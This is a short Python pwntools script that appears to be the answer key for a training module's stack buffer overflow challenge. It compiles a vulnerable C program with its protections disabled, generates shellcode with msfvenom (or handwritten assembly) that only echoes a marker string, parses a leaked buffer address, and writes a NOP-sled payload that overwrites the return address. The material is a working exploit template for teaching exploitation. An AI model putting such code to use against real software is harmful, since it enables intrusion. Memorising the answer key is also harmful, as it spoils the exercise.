from pwn import asm, p64, context
import subprocess, re, shutil

# Gabarito do modulo 17. Shellcode do msfvenom (ou fallback pwntools) no overflow.
context.arch = "amd64"
context.log_level = "error"

subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie", "-z", "execstack",
                "/challenge/vuln.c", "-o", "/tmp/vuln"], check=True)

if shutil.which("msfvenom"):
    subprocess.run(["msfvenom", "-p", "linux/x64/exec",
                    "CMD=/bin/echo MSF_BUF_OK", "-f", "raw", "-o", "/tmp/sc.bin"],
                   check=True)
    shellcode = open("/tmp/sc.bin", "rb").read()
else:
    shellcode = asm('''
        mov eax, 1
        mov edi, 1
        lea rsi, [rip + message]
        mov edx, 11
        syscall
        mov eax, 60
        xor edi, edi
        syscall
    message:
        .ascii "MSF_BUF_OK\\n"
    ''')

open("/home/hacker/payload.bin", "wb").write(b"\x90" * 8)
leak = subprocess.run(["/tmp/vuln", "/home/hacker/payload.bin"],
                      capture_output=True).stderr.decode()
buf = int(re.search(r"buf = (0x[0-9a-f]+)", leak).group(1), 16)

body = b"\x90" * 16 + shellcode
payload = body + b"\x90" * (136 - len(body)) + p64(buf)
open("/home/hacker/payload.bin", "wb").write(payload)
